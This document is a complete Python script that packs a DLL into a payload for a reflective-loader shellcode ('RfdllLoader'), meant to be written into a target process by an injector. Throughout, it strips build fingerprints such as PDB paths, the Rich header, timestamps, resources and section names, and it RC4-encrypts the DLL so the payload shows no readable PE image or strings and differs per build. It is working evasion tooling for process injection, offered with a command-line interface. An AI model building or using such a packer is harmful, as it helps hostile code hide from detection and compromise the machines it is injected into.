#!/usr/bin/env python3
"""
Payload packer for the RfdllLoader reflective loader shellcode.

Payload layout (what the injector carries and writes into the target):

    offset 0                     loader.bin (position independent loader code)
    pad up to a page boundary    0xCC filler, so loader code and metadata never
                                 share a page (the injector can give the code
                                 RX and the metadata/data RW)
    meta offset (page aligned)   meta header, 19 bytes:
                                   magic       8   "RFDLMETA"
                                   version     1   currently 1
                                   flags       1   bit0: PE headers were stripped
                                   keylen      1   1..255, 0 = payload not RC4 encrypted
                                   dll_size    4   little endian, plaintext DLL length
                                   host_hash   4   little endian, reserved for the host
                                                   module placement mode (0 = map privately)
                                 rc4_key     keylen
                                 rc4(dll)    dll_size

The DLL is RC4 encrypted. RC4 is a stream cipher, so decryption is the same
operation as encryption. The loader decrypts in place in the payload area, maps
the image, wipes the decrypted data and the key, and then hands the payload area
to the loaded DLL so it can release it.

Nothing here is strong cryptography: the point of the RC4 layer is that the
payload carries no readable PE image and no readable import/export strings, and
that each build differs. The loader itself stays plaintext, it has to be
executable.

Usage:
    pack.py --dll payload.dll [--loader loader.bin] [--key <hex> | --seed <int>]
            [--out payload.bin] [--info payload_info.json] [--keep-resource]
            [--keep-debug] [--keep-loadconfig] [--no-strip] [--no-rc4]
"""

import argparse
import hashlib
import json
import os
import random
import struct
import sys

MAGIC = b"RFDLMETA"
VERSION = 1
META_HEADER_SIZE = 19
PAGE_SIZE = 0x1000
FILLER = 0xCC

FLAG_HEADERS_STRIPPED = 0x01

DIR_EXPORT = 0
DIR_IMPORT = 1
DIR_RESOURCE = 2
DIR_EXCEPTION = 3
DIR_SECURITY = 4
DIR_BASERELOC = 5
DIR_DEBUG = 6
DIR_TLS = 9
DIR_LOAD_CONFIG = 10
DIR_BOUND_IMPORT = 11
DIR_IAT = 12
DIR_DELAY_IMPORT = 13

SCN_MEM_DISCARDABLE = 0x02000000
SCN_MEM_EXECUTE = 0x20000000
SCN_MEM_READ = 0x40000000
SCN_MEM_WRITE = 0x80000000

IMAGE_FILE_MACHINE_AMD64 = 0x8664
PE32_PLUS_MAGIC = 0x20B
OPTIONAL_HEADER64_SIZE = 240


class PackError(Exception):
    """Anything that makes the payload unusable."""


# --------------------------------------------------------------------------
# RC4
# --------------------------------------------------------------------------

def rc4(key, data):
    """RC4 keystream XOR. Encryption and decryption are the same call."""
    if len(key) == 0:
        raise PackError("empty RC4 key")
    state = list(range(256))
    j = 0
    for i in range(256):
        j = (j + state[i] + key[i % len(key)]) & 0xFF
        state[i], state[j] = state[j], state[i]

    out = bytearray(len(data))
    i = 0
    j = 0
    for n in range(len(data)):
        i = (i + 1) & 0xFF
        j = (j + state[i]) & 0xFF
        state[i], state[j] = state[j], state[i]
        out[n] = data[n] ^ state[(state[i] + state[j]) & 0xFF]
    return bytes(out)


# --------------------------------------------------------------------------
# Minimal PE reader / header cleaner
# --------------------------------------------------------------------------

class PeImage:
    """Just enough PE parsing to clean headers and to sanity check the input."""

    def __init__(self, data):
        self.data = bytearray(data)
        if len(self.data) < 0x40 or self.data[0:2] != b"MZ":
            raise PackError("input is not a PE image (no MZ)")
        self.e_lfanew = self.u32(0x3C)
        if self.e_lfanew + 24 > len(self.data):
            raise PackError("e_lfanew outside the file")
        if bytes(self.data[self.e_lfanew:self.e_lfanew + 4]) != b"PE\0\0":
            raise PackError("input is not a PE image (no PE signature)")

        self.pe = self.e_lfanew
        self.machine = self.u16(self.pe + 4)
        self.num_sections = self.u16(self.pe + 6)
        self.size_optional = self.u16(self.pe + 20)
        self.optional = self.pe + 24
        self.magic = self.u16(self.optional)
        self.section_table = self.optional + self.size_optional

        if self.machine != IMAGE_FILE_MACHINE_AMD64:
            raise PackError("input is not x64 (machine 0x%04x)" % self.machine)
        if self.magic != PE32_PLUS_MAGIC:
            raise PackError("input is not PE32+ (magic 0x%03x)" % self.magic)
        if self.size_optional != OPTIONAL_HEADER64_SIZE:
            # The loader requires exactly this, so refuse early instead of
            # producing a payload that cannot be loaded.
            raise PackError("SizeOfOptionalHeader is %d, the loader needs %d"
                            % (self.size_optional, OPTIONAL_HEADER64_SIZE))
        if self.num_sections == 0 or self.section_table + self.num_sections * 40 > len(self.data):
            raise PackError("section table outside the file")

        self.size_of_image = self.u32(self.optional + 56)
        self.size_of_headers = self.u32(self.optional + 60)
        if self.size_of_image == 0 or self.size_of_image > 0x7FFFFFFF:
            raise PackError("SizeOfImage 0x%x is not usable" % self.size_of_image)

    # -- primitive readers ------------------------------------------------
    def u16(self, off):
        return struct.unpack_from("<H", self.data, off)[0]

    def u32(self, off):
        return struct.unpack_from("<I", self.data, off)[0]

    # -- sections ---------------------------------------------------------
    def section(self, index):
        base = self.section_table + index * 40
        return {
            "index": index,
            "header": base,
            "name": bytes(self.data[base:base + 8]),
            "virtual_size": self.u32(base + 8),
            "virtual_address": self.u32(base + 12),
            "raw_size": self.u32(base + 16),
            "raw_offset": self.u32(base + 20),
            "characteristics": self.u32(base + 36),
        }

    def rva_to_offset(self, rva):
        # headers first
        if rva < self.size_of_headers:
            return rva
        for i in range(self.num_sections):
            s = self.section(i)
            size = s["virtual_size"] or s["raw_size"]
            if s["virtual_address"] <= rva < s["virtual_address"] + size:
                return s["raw_offset"] + (rva - s["virtual_address"])
        return None

    # -- data directories -------------------------------------------------
    def directory(self, index):
        off = self.optional + 112 + index * 8
        return self.u32(off), self.u32(off + 4)

    def zero_directory(self, index):
        off = self.optional + 112 + index * 8
        self.data[off:off + 8] = b"\0" * 8

    def zero(self, offset, size):
        if offset is None or offset < 0 or size <= 0:
            return 0
        end = min(offset + size, len(self.data))
        if end <= offset:
            return 0
        self.data[offset:end] = b"\0" * (end - offset)
        return end - offset


def strip_headers(pe, keep_resource, keep_debug, keep_loadconfig):
    """Remove what a self mapping loader does not need and what is a giveaway.

    Kept on purpose, because the mapped image has to stay a syntactically valid
    PE that the C runtime and ntdll helpers may read: MZ plus e_lfanew, the PE
    signature, the file header, the essential optional header fields, the
    BASERELOC / IMPORT / TLS / EXCEPTION directories and the section table
    including its raw offsets.
    """
    report = {}

    # DOS stub body and the Rich header sit between the MZ header and the PE
    # header. Only e_magic and e_lfanew are needed.
    report["dos_stub"] = pe.zero(0x40, pe.e_lfanew - 0x40)

    # Compiler and build fingerprints.
    pe.zero(pe.optional + 2, 2)                      # Major/MinorLinkerVersion
    pe.zero(pe.pe + 8, 4)                            # TimeDateStamp
    pe.zero(pe.optional + 64, 4)                     # CheckSum
    pe.zero(pe.optional + 40, 12)                    # OS/Image version fields
    pe.zero(pe.optional + 52, 4)                     # Win32VersionValue

    # Debug directory: the PDB path is the most direct fingerprint there is.
    if not keep_debug:
        rva, size = pe.directory(DIR_DEBUG)
        if rva != 0 and size != 0:
            off = pe.rva_to_offset(rva)
            if off is not None:
                entries = size // 28
                for i in range(entries):
                    entry = off + i * 28
                    if entry + 28 > len(pe.data):
                        break
                    size_of_data = struct.unpack_from("<I", pe.data, entry + 16)[0]
                    address_of_raw_data = struct.unpack_from("<I", pe.data, entry + 20)[0]
                    pointer_to_raw_data = struct.unpack_from("<I", pe.data, entry + 24)[0]
                    raw = pointer_to_raw_data or pe.rva_to_offset(address_of_raw_data)
                    pe.zero(raw, size_of_data)
                pe.zero(off, entries * 28)
        pe.zero_directory(DIR_DEBUG)
        report["debug"] = 1

    # Resources: nothing in our payloads uses them, and they carry strings.
    if not keep_resource:
        rva, size = pe.directory(DIR_RESOURCE)
        if rva != 0 and size != 0:
            off = pe.rva_to_offset(rva)
            if off is not None:
                # The whole resource tree lives in one section normally.
                for i in range(pe.num_sections):
                    s = pe.section(i)
                    if s["raw_offset"] <= off < s["raw_offset"] + s["raw_size"]:
                        pe.zero(s["raw_offset"], s["raw_size"])
                        break
        pe.zero_directory(DIR_RESOURCE)
        report["resource"] = 1

    # Load config: the loader does not apply it, and a stale CFG pointer is worse
    # than none at all.
    if not keep_loadconfig:
        pe.zero_directory(DIR_LOAD_CONFIG)
        report["load_config"] = 1

    # We never process bound or delay loaded imports.
    pe.zero_directory(DIR_BOUND_IMPORT)
    pe.zero_directory(DIR_DELAY_IMPORT)
    report["bound_and_delay_import"] = 1

    # Section names: keep them conventional but derived, so no build specific
    # strings survive.
    renamed = 0
    for i in range(pe.num_sections):
        s = pe.section(i)
        ch = s["characteristics"]
        if ch & SCN_MEM_DISCARDABLE:
            name = b".reloc"
        elif ch & SCN_MEM_EXECUTE:
            name = b".text"
        elif ch & SCN_MEM_WRITE:
            name = b".data"
        else:
            name = b".rdata"
        if s["name"].rstrip(b"\0") != name:
            renamed += 1
        pe.data[s["header"]:s["header"] + 8] = name + b"\0" * (8 - len(name))
    report["section_names_renamed"] = renamed

    return report


# --------------------------------------------------------------------------
# Payload assembly
# --------------------------------------------------------------------------

def build_meta(key, dll_size, flags, host_hash):
    if not (0 <= len(key) <= 255):
        raise PackError("RC4 key length must fit in one byte")
    if dll_size <= 0 or dll_size > 0x7FFFFFFF:
        raise PackError("DLL size 0x%x is not usable" % dll_size)
    return (MAGIC
            + struct.pack("<B", VERSION)
            + struct.pack("<B", flags)
            + struct.pack("<B", len(key))
            + struct.pack("<I", dll_size)
            + struct.pack("<I", host_hash))


def pack_payload(loader, dll, key, host_hash=0, strip=True,
                 keep_resource=False, keep_debug=False, keep_loadconfig=False):
    """Assemble the payload. Returns (payload bytes, metadata report)."""
    if len(loader) == 0:
        raise PackError("loader.bin is empty")
    if len(loader) > 0x100000:
        raise PackError("loader.bin is suspiciously large (%d bytes)" % len(loader))
    if MAGIC in loader:
        # The loader scans this magic to find the metadata; a copy inside the
        # code would make the scan stop at the wrong place.
        raise PackError("loader.bin contains the metadata magic")

    pe = PeImage(dll)
    flags = 0
    report = {}
    if strip:
        report = strip_headers(pe, keep_resource, keep_debug, keep_loadconfig)
        flags |= FLAG_HEADERS_STRIPPED
    stripped = bytes(pe.data)

    # Code and data must not share a page, so the metadata starts on a boundary.
    meta_offset = (len(loader) + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1)
    padding = meta_offset - len(loader)

    meta = build_meta(key, len(stripped), flags, host_hash)
    if len(meta) != META_HEADER_SIZE:
        raise PackError("internal: metadata header size mismatch")

    cipher = rc4(key, stripped) if key else stripped

    payload = bytearray()
    payload += loader
    payload += bytes([FILLER]) * padding
    payload += meta
    payload += key
    payload += cipher

    info = {
        "magic": MAGIC.decode("ascii"),
        "version": VERSION,
        "flags": flags,
        "headers_stripped": bool(flags & FLAG_HEADERS_STRIPPED),
        "loader_size": len(loader),
        "loader_padding": padding,
        "meta_offset": meta_offset,
        "meta_header_size": META_HEADER_SIZE,
        "key_offset": meta_offset + META_HEADER_SIZE,
        "keylen": len(key),
        "data_offset": meta_offset + META_HEADER_SIZE + len(key),
        "dll_size": len(stripped),
        "dll_size_rc4": bool(key),
        "host_hash": host_hash,
        "payload_size": len(payload),
        "size_of_image": pe.size_of_image,
        "strip_report": report,
        "loader_sha256": hashlib.sha256(loader).hexdigest(),
        "dll_in_sha256": hashlib.sha256(dll).hexdigest(),
        "dll_stripped_sha256": hashlib.sha256(stripped).hexdigest(),
        "payload_sha256": hashlib.sha256(bytes(payload)).hexdigest(),
    }
    return bytes(payload), info


# --------------------------------------------------------------------------
# Command line
# --------------------------------------------------------------------------

def parse_key(args):
    if args.no_rc4:
        return b""
    if args.key:
        try:
            key = bytes.fromhex(args.key)
        except ValueError:
            raise PackError("--key is not hex")
        return key
    if args.seed is not None:
        rng = random.Random(args.seed)
        return bytes(rng.randrange(256) for _ in range(args.keylen))
    return bytes(random.SystemRandom().randrange(256) for _ in range(args.keylen))


def main(argv=None):
    here = os.path.dirname(os.path.abspath(__file__))
    parser = argparse.ArgumentParser(description="Pack a DLL for the RfdllLoader shellcode")
    parser.add_argument("--dll", required=True, help="payload DLL to embed")
    parser.add_argument("--loader", default=os.path.join(here, "loader.bin"),
                        help="loader shellcode produced by build.cmd")
    parser.add_argument("--out", default="payload.bin", help="output payload")
    parser.add_argument("--info", default="payload_info.json", help="output metadata report")
    parser.add_argument("--key", default=None, help="RC4 key as hex (do not pass on shared shells)")
    parser.add_argument("--keylen", type=int, default=32, help="RC4 key length when generated")
    parser.add_argument("--seed", type=int, default=None,
                        help="deterministic key generation, for tests only")
    parser.add_argument("--host-hash", default="0",
                        help="reserved: hash of the host module name for placement mode")
    parser.add_argument("--no-strip", action="store_true", help="keep the PE headers untouched")
    parser.add_argument("--keep-resource", action="store_true")
    parser.add_argument("--keep-debug", action="store_true")
    parser.add_argument("--keep-loadconfig", action="store_true")
    parser.add_argument("--no-rc4", action="store_true", help="store the DLL in plaintext (debugging)")
    args = parser.parse_args(argv)

    try:
        with open(args.loader, "rb") as f:
            loader = f.read()
        with open(args.dll, "rb") as f:
            dll = f.read()
        key = parse_key(args)
        if len(key) > 255:
            raise PackError("--keylen must be <= 255")
        payload, info = pack_payload(
            loader, dll, key,
            host_hash=int(args.host_hash, 0),
            strip=not args.no_strip,
            keep_resource=args.keep_resource,
            keep_debug=args.keep_debug,
            keep_loadconfig=args.keep_loadconfig,
        )
        with open(args.out, "wb") as f:
            f.write(payload)
        if args.info:
            with open(args.info, "w") as f:
                json.dump(info, f, indent=2, sort_keys=True)
                f.write("\n")
    except PackError as exc:
        sys.stderr.write("pack: %s\n" % exc)
        return 1

    print("loader   : %s (%d bytes)" % (args.loader, info["loader_size"]))
    print("dll      : %s (%d bytes -> stripped %d bytes)"
          % (args.dll, len(dll), info["dll_size"]))
    print("key      : %d bytes%s" % (info["keylen"], "" if key else " (RC4 disabled)"))
    print("layout   : meta at 0x%x, key at 0x%x, data at 0x%x, payload %d bytes"
          % (info["meta_offset"], info["key_offset"], info["data_offset"], info["payload_size"]))
    if info["headers_stripped"]:
        rep = info["strip_report"]
        print("stripped : dos_stub=%d bytes, debug=%s, resource=%s, load_config=%s, "
              "bound+delay_import=%s, section names renamed=%s"
              % (rep.get("dos_stub", 0), rep.get("debug", 0), rep.get("resource", 0),
                 rep.get("load_config", 0), rep.get("bound_and_delay_import", 0),
                 rep.get("section_names_renamed", 0)))
    print("sha256   : %s" % info["payload_sha256"])
    return 0


if __name__ == "__main__":
    sys.exit(main())
